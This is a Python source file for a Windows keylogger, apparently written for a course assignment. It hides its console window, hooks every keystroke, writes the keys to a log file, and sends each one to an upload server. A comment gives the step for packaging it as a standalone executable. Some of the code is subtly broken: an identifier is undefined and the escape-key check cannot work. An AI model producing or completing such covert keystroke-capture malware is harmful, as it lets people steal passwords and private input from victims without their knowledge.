# Python code for keylogger
# to be used in windows

#Completing the last part of the assignment requires you to convert it to an executable, do this using command line pyinstaller logger.py and look in the build directory 
import os
from pathlib import Path
import pyWinhook
import pythoncom
import win32console
import win32gui
import requests
import datetime
from key_event import convert_keycode

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

timestamp = datetime.datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
log_filename = f"output_{timestamp}.txt"
log_filepath = os.path.join(Path.home(), "Downloads\\logs", log_filename)

##############################################
#
#   Keylogging [10%]
#
#   Within this function, We save each keyevent from the associated key_event
#   class which contains a breakdown conversion for each key value.
#   This will continue to log keyevents until the 'esc' key has been activated
#   before writing and sending to server.
#
##############################################
def  on_keyboard_event(event):
    if event.Ascii == 'esc':
        exit()
    keylogs = convert_keycode(event.KeyID)

    # Formatting test
    if keylogs == "spacebar":
        keylogs = " "

    with open(log_filepath, 'a') as f:
        f.write(keylogs)

    # Send the logged keystroke to the server
    requests.post('http://localhost:5000/upload', data={'keylog': keylogs, 'unique_id': unique_id})

    return True

# create a hook manager object
hm = pyWinhook.HookManager()
hm.KeyDown = on_keyboard_event
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
